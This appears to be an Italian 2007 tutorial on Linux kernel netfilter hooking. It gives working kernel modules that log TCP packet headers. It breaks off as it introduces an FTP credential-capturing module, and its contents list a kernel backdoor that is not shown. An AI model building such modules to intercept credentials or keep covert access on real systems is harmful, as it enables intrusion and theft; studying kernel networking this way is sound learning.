@@ -1,0 +1,1768 @@
+ Titolo: Linux Kernel netfilter hacking (2.4 & 2.6)
+ Autore: Marco 'Evil' Costantino
+ Data: Gennaio 2007
+
+ Mail: webmaster@eviltime.com
+ Http: www.eviltime.com
+
+[===-0x00 Indice:-========================================================]  
+
+
+	1. Prefazione
+
+	2. Introduzione teorica a netfilter
+
+	3. Hooking (base)
+	3.1 La struttura sk_buff
+	3.2 Il primo hook
+
+	4. Hoooking (sniffing)
+	4.1 Kernelbased TCP/IP sniffer
+	4.1.1 kernelsniff.c
+	4.2 Kernel FTP account sniffer
+	4.2.1 Utilizzo dei file in kernelspace
+	4.2.2 ftpacc-grabber.c
+
+	5. Hooooking (firewalling)
+	5.1 Basic deny.list Firewall
+
+	6. Hook-king (and then.. hacking)
+	6.1 Esecuzione di un file
+	6.2 Il nostro problema (interrupt context)
+	6.3 La nostra soluzione (work queues)
+	6.4 Kernel 2.6: unusual non-listening backdoor (K.R.E)
+
+	7 Conclusioni
+
+	8 Referenze
+
+
+[===-0x01 Prefazione-=====================================================] 
+
+
+ Questo testo e' rivolto a chi gia' conosce il perche' ed il come di Netfilter
+ ma ne vuole esplorare le potenzialita' applicative in modo più profondo
+ ed accurato.
+ Tutto il codice presente in questo articolo e' stato programmato, compilato
+ e testato personalmente su una slackware-current(22-01-2007) kernel 2.6.17
+ e kernel 2.4.31
+ 
+ Tutto il materiale presente in questo testo e' da considerarsi a puro 
+ scopo educativo, declino dunque ogni responsabilita' sull'uso che ne verra'
+ fatto..
+
+ I moduli presenti in questo testo possono essere compilati su kernel 2.6
+ creando un apposito Makefile (cambiare NOMEMODULO.o)
+
+ # cat > Makefile
+
+	ifndef KERNELRELEASE
+		LINUX := /usr/src/linux/
+		PWD := $(shell pwd)
+	all:
+		$(MAKE) -C $(LINUX) SUBDIRS=$(PWD) modules
+	else
+		obj-m := NOMEMODULO.o
+	endif
+
+ # make
+ # insmod NOMEMODULO.ko
+
+ e su kernel 2.4:
+
+ # gcc -c -O2 NOMEMODULO.c
+ # insmod NOMEMODULO.o
+
+ per entrambe le versioni del kernel i comandi per visualizzare l'output
+ di un modulo (printk) e per farne l'unload sono rispettivamente:
+
+ # dmesg
+ e
+ # rmmod NOMEMODULO
+
+ (evil)
+
+
+[===-0x02 Introduzione teorica a netfilter-===============================]
+
+ 
+ Per introdurre al netfilter ho deciso di appoggiarmi al sempreverde 
+ howto ufficiale, (riassumendone le parti piu' importanti) 
+ reperibile al seguente indirizzo:
+
+ http://www.netfilter.org/documentation/HOWTO/it/netfilter-hacking-HOWTO-1.html
+
+ netfilter e' un framework per il manipolamento dei pacchetti, esterno 
+ alla normale interfaccia socket Berkeley. 
+ Consta di 4 parti. 
+ Prima parte, ogni protocollo definisce degli "hook", per IPv4 abbiamo i
+ seguenti:
+
+ NF_IP_PRE_ROUTING:  Dopo aver passato il controllo di integrita' il 
+                     pacchetto passa per questo hook in attesa di 
+                     essere instradato verso un processo locale o 
+                     un'altra interfaccia 
+
+ NF_IP_LOCAL_IN:     Se il pacchetto e' destinato alla box locale 
+                     passa di qui.
+
+ NF_IP_FORWARD:      Se e' invece destinato ad un'altra interfaccia 
+                     passa di qui
+
+ NF_IP_LOCAL_OUT:    Per i pacchetti generati dall'interno
+
+ NF_IP_POST_ROUTING: Ultimo hook per il pacchetto
+
+
+ I quali sono punti ben definiti in una traversata dei pacchetti 
+ nel protocol stack. 
+ In ciascuno di questi punti, il protocollo richiamera' il framework 
+ netfilter fornendo il pacchetto e il numero dell'hook.
+
+ Seconda parte, porzioni del kernel possono registrarsi per "ascoltare",
+ per ogni protocollo, differenti hook.
+ Percio' quando un pacchetto e' passato al framework netfilter, esso
+ controlla se qualcuno si e' registrato per quel determinato protocollo
+ e hook; se si', a ciascuno di essi e' data, in ordine, una chance per esaminare
+ (e possibilmente alterare) il pacchetto, per scartarlo, 
+ per lasciarlo proseguire, o per chiedere a netfilter di accodarlo 
+ per lo userspace (spazio utente).
+
+ Terza parte, i pacchetti che sono stati accodati sono sistemati 
+ (dal driver ip_queue) per essere inviati allo userspace;
+ questi pacchetti sono gestiti in modo asincrono.
+
+
+[===-0x03 Hooking (base)-================================================] 
+
+
+ Il netfilter hooking si presenta come un ulteriore fase di filtraggio
+ del pacchetto, permettendo la modifica e l'analisi in tempo reale 
+ dello stesso, interagendo con una semplice struttura skbuff.
+ (/usr/src/linux-VERSION/include/linux/skbuff.h)
+
+ Prima ancora di spiegare le tecniche di programmazione usate per 
+ registrare un hook, introduciamo i valori di ritorno del netfilter..
+ Una volta finito di processare il pacchetto via hook siamo tenuti ad
+ informare il sistema sul comportamento da adottare, abbiamo dunque 5 
+ scelte:
+
+ NF_ACCEPT: Accetta il pacchetto
+ NF_DROP:   Scarta il pacchetto
+ NF_QUEUE:  Accoda il pacchetto, passando le possibilita' di manipolazione 
+            a user-space
+ NF_STOLEN: Trattiene il pacchetto al fine di processarlo internamente
+            all'hook
+ NF_REPEAT: Ripete nuovamente il processo di hooking 
+
+ Vediamo adesso di analizzare il layout di un hook, e di comprendere 
+ quindi al meglio le potenzialita' offerte da netfilter.
+
+ Per un hooking di base abbiamo bisogno di 3 librerie in aggiunta alle
+ solite librerie impiegate in un normale lkm
+ 
+ 1. Librerie necessarie:
+
+ #include <linux/skbuff.h>         // gia' vista in precedenza
+ #include <linux/netfilter.h>      // libreria di netfilter
+ #include <linux/netfilter_ipv4.h> // specifica per IPv4
+
+ 2. La struttura nf_hook_ops:
+
+ Questa struttura ci permette di specificare la famiglia di protocolli
+ che si vuole andare a gestire, la funzione di hook che se ne occupera',
+ la priorita' con la quale quest'ultima dovra' essere eseguita e infine
+ il numero identificatore dell'hook dal quale verra' chiamata la nostra
+ funzione.
+ Questa struttura si presenta esattamente cosi':
+
+ struct nf_hook_ops 
+ {
+         struct list_head list;
+ 
+         nf_hookfn *hook;
+         struct module *owner;
+         int pf;
+         int hooknum;
+         int priority;
+ };
+
+ hook:     Il nome della funzione che si occupera' di gestire l'hook
+ pf:       La famiglia di protocolli da filtrare (es. INET) 
+ hooknum:  Il numero identificatore dell'hook dal quale verra' chiamata 
+           la nostra funzione (es. NF_IP_PRE_ROUTING)	
+ priority: Il grado di priorita' con il quale andra' eseguito il nostro hook
+
+ 3. La funzione di hook:
+
+ Al centro del modulo vediamo quindi protagonista la funzione che si 
+ occupera' di gestire l'hooking:
+
+
+ /* la dichiarazione della funzione e' sempre la stessa, ovviamente il 
+    nome (my_hook) e' di vostra scelta */
+
+ unsigned int my_hook(unsigned int hooknum,
+                      struct sk_buff **skb,
+                      const struct net_device *in,
+                      const struct net_device *out,
+                      int (*okfn)(struct sk_buff *))
+ {
+   /* Qui va' inserito cio' che si desidera' fare del pacchetto */
+   return NF_DROP; // in questo modo ad esempio il pacchetto verra' ignorato
+ }
+
+ 4. Inserimento e rimozione (register & unregister)
+
+ Infine mancano le funzioni di registrazione e rimozione della nostra 
+ funzione di hook, che sono rispettivamente:
+
+ int nf_register_hook(struct nf_hook_ops *reg)
+ int nf_unregister_hook(struct nf_hook_ops *reg) 
+
+ Personalmente credo che si tratti di passaggi e direttive molto meccaniche,
+ ed il tutto verra' più semplice proseguendo nell'articolo e dando quindi
+ una prima occhiata ad un nf_hook funzionante
+
+
+[===-0x03a La struttura sk_buff-=========================================] 
+
+
+ Prima di proseguire oltre e' necessario introdurre la struttura sk_buff,
+ ovvero la serie di buffer coi quali il kernel gestisce i pacchetti di rete,
+ il pacchetto una volta ricevuto dalla scheda di rete, viene messo in
+ una struttura di questo tipo e solo dopo viene passato alla gestione 
+ vera e propria.
+
+ possiamo trovare i sorgenti di questa struttura all'interno dell'header
+ file <linux/skbuff.h>
+ 
+ Tra le varie union contenute in questa struttura, possiamo notare subito
+ quelle di nostre interesse. Il Transport layer:
+
+ 
+	/* Transport layer header */
+	union
+	{
+		struct tcphdr	*th;
+		struct udphdr	*uh;
+		struct icmphdr	*icmph;
+		struct igmphdr	*igmph;
+		struct iphdr	*ipiph;
+		struct spxhdr	*spxh;
+		unsigned char	*raw;
+	} h;
+
+ E ancora più importante per quanto riguarda quello che tratteremo
+ nel seguito di questo testo, il network layer:
+
+	/* Network layer header */
+	union
+	{
+		struct iphdr	*iph;
+		struct ipv6hdr	*ipv6h;
+		struct arphdr	*arph;
+		struct ipxhdr	*ipxh;
+		unsigned char	*raw;
+	} nh;
+  
+ Questi 2 sono rispettivamente il livello 4 e 3 del modello ISO/OSI,
+ un modello convenzionale per la standardizzazione dello scambio dati
+ via internet, ed e' composto esattamente di 7 livelli, aventi ognuno
+ i propri protocolli di comunicazione:
+
+ 7. Applicazion layer - interfaccia utente e macchina (applicazione)
+ 6. Presentation layer - riformattazione dei dati e crittografia
+ 5. Session layer - gestione delle connessioni tra applicazioni cooperanti
+
+ 4. Transport layer:
+ Si tratta del livello che si occupa di trasferire dati da un host ad 
+ un'altro, in internet questa funzione e' controllata da protocolli
+ quali TCP, UDP, ICMP, IGMP ecc..
+
+ 3. Network layer
+ Fa' in modo di calcolare il tragitto migliore (routing) che il pacchetto 
+ dati andra' ad effettuare, servendosi delle tabelle di instradamento
+ (routing table) dei pacchetti. Si occupa inoltre del controllo del
+ flusso dei dati e della frammentazione (nel caso i pacchetti siano troppo
+ grandi).
+ Il protocollo più comunemente usato da questo livello e' l'IP
+
+ 2. Data link layer - controllo errori e sincronizzazione dei dati
+ 1. Physical layer - gestisce il collegamento fisico, trasmissione binaria 
+ dei dati al livello successivo.
+
+ Trovata dunque la struttura di nostro interesse all'interno 
+ di sk_buff, non ci resta che analizzare il contenuto di essa alla ricerca
+ del dato che si vuole raccogliere da un pacchetto in entrata o in uscita.
+
+
+[===-0x03b Il primo hook-================================================] 
+
+
+ Come primo hook abbiamo bisogno di qualcosa di estremamente semplice 
+ come ad esempio puo' essere un alert su ricezione di un pacchetto TCP 
+ proveniente da qualsiasi porta..
+ Sono al corrente del fatto che qualcuno possa non essere a conoscenza
+ della struct sk_buff (spiegata al prossimo capitolo) usata in questo codice, 
+ ma credo che il lettore abbia bisogno prima di farsi un idea più pratica
+ delle potenzialita' di questa tecnica, buon copia-incolla :)
+ 
+ (vi ricordo che per vedere l'output di un modulo si necessita l'uso
+ del comando 'dmesg')
+
+ //-<inizio codice: 1st_hook.c>-------------------------------------------
+
+ #define __KERNEL__
+ #define MODULE
+
+ #include <linux/module.h>
+ #include <linux/kernel.h>
+ #include <linux/init.h>
+
+ /* punto uno... le librerie necessarie */
+
+ #include <linux/skbuff.h>         // linux kernel socket buffer structure
+ #include <linux/netfilter.h>      // netfilter
+ #include <linux/netfilter_ipv4.h> // specifica per IPv4
+ #include <linux/in.h>
+ #include <linux/tcp.h>
+ #include <linux/ip.h>
+
+ unsigned int my_hook(unsigned int,
+                      struct sk_buff **,
+                      const struct net_device *,
+                      const struct net_device *,
+                      int (*okfn)(struct sk_buff *));
+
+ static struct nf_hook_ops nfhook;  // nf_hook_ops structure
+
+ int __init load(void) {
+
+	/* punto due... la struttura nf_hook_ops */
+	nfhook.hook = my_hook;                // la nostra funzione
+	nfhook.hooknum = NF_IP_PRE_ROUTING;   // ipv4 prerouting
+	nfhook.pf = PF_INET;                  // protocol family
+	nfhook.priority = NF_IP_PRI_FIRST;    // primo hook da eseguire
+
+        nf_register_hook(&nfhook);            // registrazione hook
+        return 0;
+
+ }
+
+ void __exit unload(void) {
+
+        nf_unregister_hook(&nfhook);          // rimozione hook
+
+ }
+
+ unsigned int my_hook(unsigned int hooknum,
+                      struct sk_buff **skb,
+                      const struct net_device *in,
+                      const struct net_device *out,
+                      int (*okfn)(struct sk_buff *))
+ {
+        struct sk_buff *sb = *skb;
+        struct tcphdr *thead;
+	int dest_port = 0;
+
+        if (sb->nh.iph->protocol != IPPROTO_TCP) {
+                 return NF_ACCEPT;
+        }
+
+        thead = (struct tcphdr *)(sb->data + (sb->nh.iph->ihl * 4));
+	dest_port = htons(thead->dest);
+        printk("1st_hook.c: packet received on port %i\n", dest_port);
+	return NF_ACCEPT;
+
+ }
+
+
+ module_init(load);
+ module_exit(unload);
+
+ MODULE_LICENSE("GPL");
+
+ //-<fine codice: 1st_hook.c>---------------------------------------------
+
+
+[===-0x04 Hoooking (sniffing)-============================================] 
+
+
+ Lo sniffing e' l'attivita' di intercettazione dei dati all'interno di una rete,
+ via l'uso dei netfilter hooks e' quasi sicuramente una delle operazioni
+ più semplici da attuare.
+
+ Nell'esempio precedente abbiamo visto come sia possibile intercettare 
+ tutti i pacchetti in entrata e scrivere a video la porta di destinazione
+ di ognuno.
+ Nell'esempio che segue invece costruiremo uno sniffer molto banale
+ che si occupera' di fornirci informazioni quali IP sorgente/destinatario
+ e porta sorgente/destinataria sia sui pacchetti in entrata che sui
+ pacchetti in uscita.
+
+ Andiamo dunque a vedere dove sono contenute le informazioni che ci interessano
+ ponendoci poche semplici domande:
+
+ 1) Quale livello ISO/OSI gestisce le informazioni che ci interessano?
+
+ Il livello interessato e' il Network layer
+
+ 2) Quale protocollo dovremo interpellare?
+
+ Il protocollo contenente le informazioni riguardanti gli indirizzi
+ e' l'IP, controllando dunque la union contenuta in skbuff.h possiamo 
+ vedere quale struttura specifica se ne occupa:
+
+	/* Network layer header */
+	union
+	{
+		struct iphdr	*iph; // IP
+		struct ipv6hdr	*ipv6h;
+		struct arphdr	*arph;
+		struct ipxhdr	*ipxh;
+		unsigned char	*raw;
+	} nh;
+
+ la struttura di nostro interesse e' "iph" il percorso per raggiungerla sara'
+ dunque sk_buff->nh.iph, sara' quindi necessario venire a conoscenza
+ del contenuto di questa struttura per sapere quale buffer conterra'
+ l'indirizzo sorgente e quale quello destinatario in ogni pacchetto.
+ Per trovare l'header file contenente la struttura che ci interessa 
+ (e sara' cosi' per ogni altra struttura o pezzo di codice che ci interessa)
+ basta spostarsi all'i'nterno della directory contenente gli include di sistema
+ (solitamente /usr/include/) ed effettuare un grep ricorsivo sulla stringa
+ "struct iphdr {".
+ 
+ evil@eviltime:/usr/include$ grep -r struct\ iphdr\ { *
+ linux/ip.h:struct iphdr {
+
+ Apriamo dunque il file ip.h con un editor di testo e ricerchiamo la struttura:
+
+ struct iphdr {
+ #if defined(__LITTLE_ENDIAN_BITFIELD)
+	__u8	ihl:4,
+		version:4;
+ #elif defined (__BIG_ENDIAN_BITFIELD)
+	__u8	version:4,
+  		ihl:4;
+ #else
+ #error	"Please fix <asm/byteorder.h>"
+ #endif
+	__u8	tos;
+	__u16	tot_len;
+	__u16	id;
+	__u16	frag_off;
+	__u8	ttl;
+	__u8	protocol;
+	__u16	check;
+	__u32	saddr;
+	__u32	daddr;
+	/*The options start here. */
+ };
+
+
+ Basta una minima conoscenza delle reti o un po' di intuizione per riconoscere
+ i campi di nostro interesse 
+
+ 	__u32	saddr; /* indirizzo IP sorgente */
+	__u32	daddr; /* indirizzo IP di destinazione */
+
+ Li possiamo distinguere facilmente poiche' sono gli unici dichiarati a 32 bit,
+ che e' l'esatta dimensione di un indirizzo IP (4 byte).
+
+ Per quanto riguarda le porte dovremo invece riferirci alle strutture riguardanti
+ il protocollo TCP, eseguiamo nuovamente le procedure usate in precedenza
+ e guardiamo quindi all'interno di <linux/tcp.h>:
+
+ struct tcphdr {
+	__u16	source;
+	__u16	dest;
+ [...]
+
+ due unsigned da 16bit, source per la porta sorgente e dest per la porta di
+ destinazione, ricapitolando abbiamo dunque le seguenti informazioni:
+
+ Indirizzo IP sorgente:		sk_buff->nh.iph->saddr
+ Indirizzo IP di destinazione:	sk_buff->nh.iph->daddr
+ Porta sorgente:		sk_buff->h.th->source
+ Porta di destinazione:		sk_buff->h.th->dest
+
+ 3) Di quale hook di protocollo abbiamo bisogno?
+
+ Nel nostro sniffer ci occupiamo di controllare il traffico sia in entrata
+ che in uscita avremo dunque bisogno di registrare due hook diversi, uno
+ in NF_IP_PRE_ROUTING per i pacchetti in entrata ed un'altro in 
+ NF_IP_POST_ROUTING per i pacchetti in uscita.
+
+ 
+[===-0x04a Kernelbased TCP/IP sniffer-====================================] 
+
+
+ Prima di lasciarvi al codice, bisogna chiarire alcune cose a riguardo
+ dei dati che andremo a prelevare dalla struttura, si tratta infatti di 
+ dati in forma diversa da quella convenzionale utilizzata per 
+ interfacciare al meglio utente -> macchina, avremo infatti indirizzi
+ composti da cifre esadecimali, per portarli alla forma decimale ci 
+ serviremo dunque di htons() per le porte
+
+ uint16_t htons(uint16_t hostshort);
+
+ e NIPQUAD() per gli indirizzi IP <linux/kernel.h>
+
+ /*
+  *      Display an IP address in readable format.
+  */
+
+ #define NIPQUAD(addr) \
+	((unsigned char *)&addr)[0], \
+	((unsigned char *)&addr)[1], \
+	((unsigned char *)&addr)[2], \
+	((unsigned char *)&addr)[3]
+
+ #if defined(__LITTLE_ENDIAN)
+
+ 
+ //-<inizio codice: sniffer-beta.c>-----------------------------------
+
+ #define __KERNEL__
+ #define MODULE
+
+ #include <linux/module.h>
+ #include <linux/kernel.h>
+ #include <linux/init.h>
+
+ #include <linux/skbuff.h>		// linux kernel socket buffer structure
+ #include <linux/netfilter.h>		// netfilter
+ #include <linux/netfilter_ipv4.h>	// specifica per ipv4
+ #include <linux/in.h>
+ #include <linux/tcp.h>
+ #include <linux/ip.h>
+
+ static struct nf_hook_ops in_hook;	// nf_hook_ops ricezione
+ static struct nf_hook_ops out_hook;	// nf_hook_ops spedizione
+
+ struct packet_data {
+	int src_port;
+	int dest_port;
+	__u32 src_ip;
+	__u32 dest_ip;
+ };
+
+ unsigned int _inpacket(unsigned int hooknum,
+			struct sk_buff **skb,
+			const struct net_device *in,
+			const struct net_device *out,
+			int (*okfn)(struct sk_buff *))
+ {
+	struct sk_buff *sb = *skb;
+	struct packet_data packet;
+
+	if (sb->nh.iph->protocol != IPPROTO_TCP) { return NF_ACCEPT; }
+
+	packet.src_port = htons(sb->h.th->source);
+	packet.dest_port = htons(sb->h.th->dest);
+	packet.src_ip = sb->nh.iph->saddr;
+	packet.dest_ip = sb->nh.iph->daddr;
+
+	printk("\n(kernel sniffer): incoming packet captured\n");
+	printk("\tsource port\t\t= %i\n", packet.src_port);
+	printk("\tdestination port\t= %i\n", packet.dest_port);
+	printk("\tsource IP\t= %d.%d.%d.%d\t\n", NIPQUAD(packet.src_ip));
+	printk("\tdestination IP\t= %d.%d.%d.%d\t\n", NIPQUAD(packet.dest_ip)); 
+
+	return NF_ACCEPT;
+ }
+ 
+ unsigned int _outpacket(unsigned int hooknum,
+			struct sk_buff **skb,
+			const struct net_device *in,
+			const struct net_device *out,
+			int (*okfn)(struct sk_buff *))
+ {
+	struct sk_buff *sb = *skb;
+	struct packet_data packet;
+
+	if (sb->nh.iph->protocol != IPPROTO_TCP) { return NF_ACCEPT; }
+
+	packet.src_port = htons(sb->h.th->source);
+	packet.dest_port = htons(sb->h.th->dest);
+	packet.src_ip = sb->nh.iph->saddr;
+	packet.dest_ip = sb->nh.iph->daddr;
+
+	printk("\n(kernel sniffer): outgoing packet captured\n");
+	printk("\tsource port\t\t= %i\n", packet.src_port);
+	printk("\tdestination port\t= %i\n", packet.dest_port);
+	printk("\tsource IP\t= %d.%d.%d.%d\t\n", NIPQUAD(packet.src_ip));
+	printk("\tdestination IP\t= %d.%d.%d.%d\t\n", NIPQUAD(packet.dest_ip)); 
+
+	return NF_ACCEPT;
+ }
+
+ int __init load(void) {
+
+		/* riempiamo la struttura nf_hook_ops */
+		in_hook.hook = _inpacket;		// la nostra funzione
+		in_hook.hooknum = NF_IP_PRE_ROUTING;	// pacchetti in entrata
+		in_hook.pf = PF_INET;			// protocol family
+		in_hook.priority = NF_IP_PRI_FIRST;	// primo hook da eseguire
+
+		out_hook.hook = _outpacket;		// la nostra funzione
+		out_hook.hooknum = NF_IP_POST_ROUTING;	// pacchetti in uscita
+		out_hook.pf = PF_INET;			// protocol family
+		out_hook.priority = NF_IP_PRI_FIRST;	// primo hook da eseguire
+
+		nf_register_hook(&in_hook);
+		nf_register_hook(&out_hook);
+		return 0;
+ }
+
+ void __exit unload(void) {
+		nf_unregister_hook(&in_hook);
+		nf_unregister_hook(&out_hook);
+ }
+
+ module_init(load);
+ module_exit(unload);
+
+ MODULE_LICENSE("GPL");
+
+
+ //-<fine codice: sniffer-beta.c>-------------------------------------
+
+
+ Questo sniffer fa' pero' uso di due funzioni distinte, questo implica uno 
+ spreco di codice di non poco conto, ma noi programmatori ci teniamo 
+ ad esere fini e precisi, cercheremo dunque di trovare una soluzione migliore.
+
+ Quello che serve a noi e' un controllo sull'ip sorgente, nel caso in cui 
+ questo sia uguale all'ip locale assegnato all'interfaccia di rete che 
+ gestisce la connessione, allora il pacchetto sara' stato generato 
+ dall'interno altrimenti si tratta di un pacchetto ricevuto dall'esterno.
+ 
+ Per fare questo abbiamo bisogno di leggerci un po' i codici sorgenti 
+ di ifconfig, scarichiamo dunque net-tools da google e incominciamo a guardare 
+ come ifconfig ottiene l'indirizzo locale di ogni interfaccia di rete. 
+ Spulciando un po' (eufemismo) arriveremo a trovare questa interessante 
+ chiamata in lib/interface.c:
+
+ /* Support for fetching an IPX address */
+
+ #if HAVE_AFIPX
+ static int ipx_getaddr(int sock, int ft, struct ifreq *ifr)
+ {
+     ((struct sockaddr_ipx *) &ifr->ifr_addr)->sipx_type = ft;
+     return ioctl(sock, SIOCGIFADDR, ifr);
+ }
+ #endif
+
+ "Supporto per prendere un indirizzo IPX" dice il commento, e subito 
+ sotto viene effettuata una chiamata a ioctl(), 
+ andiamo a cercare questa funzione nei sorgenti del kernel, 
+ troviamo i riferimenti alla request SIOCGIFADDR e controlliamo quali chiamate 
+ effettua a sua volta.
+
+ Il file che andiamo a controllare si trova in <net/ipv4/devinet.c> e la funzione
+ che ci interessa e' la devinet_ioctl(), di questa funzione a noi servono soltanto
+ alcuni passaggi chiave:
+
+ 1) La rappresentazione di una scheda di rete all'interno del kernel e' gestita 
+ interamente dalla struct net_device (linux/netdevice.h) che vi consiglio 
+ vivamente di andare a leggere. 
+ Infatti il primo passaggio effettuato dalla funzione devinet_ioctl()
+ e' una chiamata a dev_get_by_name() per il recupero della "struct net_device" 
+ riferita all'interfaccia specificata alla funzione con l'uso del suo nome 
+ identificativo.
+
+ if ((dev = __dev_get_by_name(ifr.ifr_name)) == NULL) {
+		ret = -ENODEV;
+		goto done;
+ }
+
+ dove "dev" non e' nient'altro che una struttura di tipo net_device, 
+ dichiarata come
+
+ struct net_device *dev;
+
+ a noi bastera' dunque richiamare la funzione dev_get_by_name("eth0"); 
+ per avere la struct net_device riferita all'interfaccia eth0.
+
+
+ 2) Recupero della "struct in_device" all'interno di "dev" via 
+ l'uso della funzione in_dev_get():
+	
+	struct in_device *in_dev;
+	[...]
+	if ((in_dev=__in_dev_get(dev)) != NULL) {
+ 
+ 3) ricerca attraverso la struct in_ifaddr (linux/inetdevice.h, e' una struttura
+ dove vengono immagazzinate tutte le informazioni a riguardo di una precisa
+ interfaccia di rete) se esiste un campo ifa_label con il nome dell'interfaccia
+ ricercata da noi (es. eth0):
+
+		if (tryaddrmatch) {
+			/* Matthias Andree */
+			/* compare label and address (4.4BSD style) */
+			/* note: we only do this for a limited set of ioctls
+			   and only if the original address family was AF_INET.
+			   This is checked above. */
+			for (ifap=&in_dev->ifa_list; (ifa=*ifap) != NULL; ifap=&ifa->ifa_next) {
+				if ((strcmp(ifr.ifr_name, ifa->ifa_label) == 0)
+				    && (sin_orig.sin_addr.s_addr == ifa->ifa_address)) {
+					break; /* found */
+				}
+			}
+		}
+
+ 4) Il nostro indirizzo IP e' contenuto in ifa_address all'interno della 
+ struttura in_ifaddr che contiene il campo ifa_label == nome_interfaccia:
+
+ struct in_ifaddr
+ {
+	struct in_ifaddr	*ifa_next;
+	struct in_device	*ifa_dev;
+	u32			ifa_local;
+	u32			ifa_address;
+	u32			ifa_mask;
+	u32			ifa_broadcast;
+	u32			ifa_anycast;
+	unsigned char		ifa_scope;
+	unsigned char		ifa_flags;
+	unsigned char		ifa_prefixlen;
+	char			ifa_label[IFNAMSIZ];
+ };
+
+ la forma e' ovviamente in network-byte order esattamente come la troviamo 
+ in sk_buff..
+
+ bene... e adesso? bhe adesso tocca a voi :)
+ (per i meno volenterosi, qui sotto trovate il codice completo)
+
+
+[===-0x04b kernelsniff.c-=================================================] 
+
+
+ Le informazioni per far girare il modulo in questione sono le seguenti:
+
+ compilazione in kernel 2.4: gcc -c -O2 kernelsniff.c
+ esecuzione in kernel 2.4: insmod kernelsniff.o dev_name="nome_interfaccia"
+ (dove nome_interfaccia e' l'interfaccia usata da voi per connettervi alla
+ rete, potete vederla utilizzando il comando ifconfig dal vostro terminale)
+
+ //-<inizio codice: kernelsniff.c>--------------------------------------
+
+ /* kernelsniff.c - basic TCP/IP sniffer based on netfilter hooking techniques
+  * works cleanly in 2.4 and 2.6 kernel's series
+  *
+  * kernel 2.4 usage: insmod kernelsniff.c dev_name="myinterface"
+  * the default 'dev_name' value is "eth0"
+  *
+  */
+
+ #define __KERNEL__
+ #define MODULE
+
+ #include <linux/module.h>
+ #include <linux/kernel.h>
+ #include <linux/init.h>
+
+ #include <linux/skbuff.h>		// linux kernel socket buffer structure
+ #include <linux/netfilter.h>		// netfilter
+ #include <linux/netfilter_ipv4.h>	// specifica per ipv4
+ #include <linux/netdevice.h>
+ #include <linux/inetdevice.h> 
+ #include <linux/string.h>
+ #include <linux/in.h>
+ #include <linux/tcp.h>
+ #include <linux/ip.h>
+
+ static struct nf_hook_ops in_hook;	// nf_hook_ops ricezione
+ static struct nf_hook_ops out_hook;	// nf_hook_ops spedizione
+ static char *dev_name = "eth0";
+
+ struct packet_data {
+	char type[9];	// tipo del pacchetto, outgoing (in partenza), incoming (in arrivo)
+	int src_port;   // porta sorgente
+	int dest_port;  // porta di destinazione
+	__u32 src_ip;	// indirizzo ip sorgente
+	__u32 dest_ip;	// indirizzo ip di destinazione
+ };
+
+ MODULE_PARM(dev_name, "s");	// prelevo da insmod il nome dell'interfaccia di rete (default: eth0)
+ 
+ unsigned int _inpacket(unsigned int hooknum,
+			struct sk_buff **skb,
+			const struct net_device *in,
+			const struct net_device *out,
+			int (*okfn)(struct sk_buff *))
+ {
+	struct sk_buff *sb = *skb;
+	struct packet_data packet;
+	struct net_device *dev;		// net_device structure per l'interfaccia di rete
+	struct in_device *in_dev;
+	struct in_ifaddr **ifap;
+	struct in_ifaddr *ifa;
+
+	__u32 local_address;
+
+	if (sb->nh.iph->protocol != IPPROTO_TCP) { return NF_ACCEPT; }
+
+	/* ricerca della struttura net_device riguardante l'interfaccia di rete
+	 * specificata dall'utente */
+
+	if((dev = __dev_get_by_name(dev_name)) == NULL) {
+		printk("(kernel sniffer): the interface %s doesn't exist!\n", dev_name);
+		return NF_ACCEPT;
+	}
+
+	/* ricerca della struttura in_device all'interno di net_device */
+
+	if((in_dev=__in_dev_get(dev)) != NULL) {
+		/* ricerca della in_ifaddr riguardante l'interfaccia di nostro interesse */
+		for (ifap=&in_dev->ifa_list; (ifa=*ifap) != NULL; ifap=&ifa->ifa_next) {
+			if(strcmp(dev_name, ifa->ifa_label) == 0) 
+				/* trovata! preleviamo l'indirizzo IP della scheda */
+				local_address = ifa->ifa_address;
+		}
+	}
+
+	packet.src_port = htons(sb->h.th->source);
+	packet.dest_port = htons(sb->h.th->dest);
+	packet.src_ip = sb->nh.iph->saddr;
+	packet.dest_ip = sb->nh.iph->daddr;
+
+	if(packet.src_ip!=local_address) strcpy(packet.type, "incoming");
+	else strcpy(packet.type, "outgoing");
+
+	printk("\n(kernel sniffer): %s packet captured\n", packet.type);
+	printk("\tsource port\t\t= %i\n", packet.src_port);
+	printk("\tdestination port\t= %i\n", packet.dest_port);
+	printk("\tsource IP\t= %d.%d.%d.%d\t\n", NIPQUAD(packet.src_ip));
+	printk("\tdestination IP\t= %d.%d.%d.%d\t\n", NIPQUAD(packet.dest_ip)); 
+
+	return NF_ACCEPT;
+ }
+ 
+ int __init load(void) {
+
+		/* riempiamo la struttura nf_hook_ops */
+		in_hook.hook = _inpacket;		// la nostra funzione
+		in_hook.hooknum = NF_IP_PRE_ROUTING;	// pacchetti in entrata
+		in_hook.pf = PF_INET;			// protocol family
+		in_hook.priority = NF_IP_PRI_FIRST;	// primo hook da eseguire
+
+		out_hook.hook = _inpacket;		// la nostra funzione
+		out_hook.hooknum = NF_IP_POST_ROUTING;	// pacchetti in uscita
+		out_hook.pf = PF_INET;			// protocol family
+		out_hook.priority = NF_IP_PRI_FIRST;	// primo hook da eseguire
+
+		nf_register_hook(&in_hook);
+		nf_register_hook(&out_hook);
+		return 0;
+ }
+
+ void __exit unload(void) {
+		nf_unregister_hook(&in_hook);
+		nf_unregister_hook(&out_hook);
+ }
+
+ module_init(load);
+ module_exit(unload);
+
+ MODULE_LICENSE("GPL");
+
+
+ ---(fine codice)---------------------------------------------------------
+
+ Forse non tutti hanno compreso che quello che si e' fatto per riconoscere 
+ pacchetti in entrata e in uscita, e' una delle complicazioni più inutili 
+ che si potessero pensare, ma sono concetti che servono per ambientarsi 
+ meglio nel mondo del kernel networking :)
+ Qui sotto le uniche 2 righe necessarie al controllo:
+
+ 	if(hooknum==NF_IP_PRE_ROUTING) strcpy(packet.type, "incoming");
+	else strcpy(packet.type, "outgoing");
+
+
+[===-0x04c Kernel FTP account sniffer-====================================] 
+
+
+ Quello che andremo a toccare adesso, e' senz'altro un argomento più interessante,
+ ci diletteremo infatti nello sviluppare un modulo che si occupi di sniffare
+ il traffico FTP alla ricerca dei tentativi di autenticazione, per catturare
+ dunque USER e PASS di account FTP.
+ Il nostro modulo controllera' i pacchetti in uscita con porta di destinazione 21 (FTP)
+ e scrivera' su di un file tutto cio' che e' riuscito a prelevare..
+
+ Per proseguire nella programmazione e' necessario conoscere dove vengono
